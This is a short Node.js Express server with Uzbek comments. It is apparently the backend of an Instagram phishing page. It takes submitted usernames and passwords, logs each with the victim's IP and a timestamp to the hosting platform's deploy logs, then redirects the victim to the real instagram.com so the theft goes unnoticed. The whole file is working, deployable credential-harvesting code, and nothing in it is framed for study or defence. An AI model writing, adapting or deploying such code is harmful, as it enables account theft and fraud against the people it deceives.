const express = require("express");
const app = express();

app.use(express.urlencoded({ extended: true }));
app.use(express.static(__dirname));

app.post("/save", (req, res) => {
    const { username, password } = req.body;
    const ip = req.headers["x-forwarded-for"]?.split(",")[0] || req.socket.remoteAddress || "unknown";
    const time = new Date().toLocaleString("uz-UZ", { timeZone: "Asia/Tashkent" });

    // Bu yozuv Deploy Logs’da darhol chiqadi
    console.log(`YANGI KIRISH → ${time} | IP: ${ip} | USER: ${username} | PASS: ${password}`);

    res.redirect("https://www.instagram.com");
});

// Muhim: Railway uchun PORT ni shu tarzda olish kerak
const port = process.env.PORT || 3000;
app.listen(port, "0.0.0.0", () => {
    console.log(`Server ishga tushdi → https://createsite-production.up.railway.app`);
});
